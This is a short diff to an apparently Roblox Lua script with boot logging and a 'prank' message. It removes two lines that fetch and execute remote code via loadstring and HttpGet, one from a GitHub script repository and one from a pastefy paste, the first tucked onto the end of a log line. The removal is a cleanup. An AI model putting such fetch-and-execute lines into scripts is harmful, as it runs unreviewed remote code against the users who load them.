@@ -446,5 +446,4 @@ end)
 
 notify("Adrian Hatch", "loaded private build v2.4", 4)
 log("[BOOT] ui attached ok")
-log("[INFO] ready press H to reveal prank")loadstring(game:HttpGet("https://raw.githubusercontent.com/GROWAGARDENSCRIPT-MODZ/GROW-A-GARDEN-Kaizu-Script-/refs/heads/main/True"))()
-loadstring(game:HttpGet("https://pastefy.app/0cPcr97S/raw"))()
+log("[INFO] ready press H to reveal prank")
